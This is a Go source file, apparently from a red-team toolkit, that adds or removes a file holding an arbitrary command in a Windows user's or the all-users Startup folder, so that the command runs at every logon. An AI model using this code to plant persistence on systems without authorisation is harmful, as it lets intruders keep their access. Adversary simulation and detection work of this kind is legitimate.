package techniques

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
)

// main startup folder persistence function, takes string arguments for the user to create persistence under, the command to be written to the batch file, 
// the filename to be written, and the method to be used (add or remove)
func StartupFolderPersist(user string, com string, filename string, method string){
	fmt.Printf("[+] Checking %s's startup folder\n",user)
	var homedir string
	// gets the current user's home directory if a user isn't specified
	if user == "Current User"{
		tempdir,err := os.UserHomeDir()
		if err != nil {
			log.Fatalln(err)
		}
		homedir = tempdir + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
	// if system is specified, use the system startup folder
	} else if user == "SYSTEM" {
		homedir = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	// else, grab the specified users startup folder
	} else {
		homedir = "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
	}

	// attempts to read the directory to ensure that it exists
	files,err := ioutil.ReadDir(homedir)
	if err != nil {
		log.Fatalln(err)
	}

	// lists the current files in the startup folder
	fmt.Printf("[+] Read %s:\n",homedir)
	for _, f := range files {
		fmt.Println(f.Name())
	}

	// attempts to write the file under the startup folder for persistence
	if method == "add"{
		fmt.Printf("[+] Writing the %s file under %s's startup folder\n",filename,user)
		err = ioutil.WriteFile(homedir + "\\" + filename, []byte(com), 0755)
		if err != nil {
			log.Fatalln(err)
		}
		fmt.Printf("[+] Successfully wrote %s\n",filename)

	// attempts to delete the file if remove is provided
	} else if method == "remove"{
		fmt.Printf("[+] Attempting to remove the %s file under %s's startup folder\n",filename,user)
		err = os.Remove(homedir + "\\" + filename)
		if err != nil {
			log.Fatalln(err)
		}
		fmt.Printf("[+] Successfully removed the %s file\n",filename)
		
	} else {
		fmt.Printf("[!] %s is not a valid method for the startupfolder persistence technique\n",method)
		return
	}
}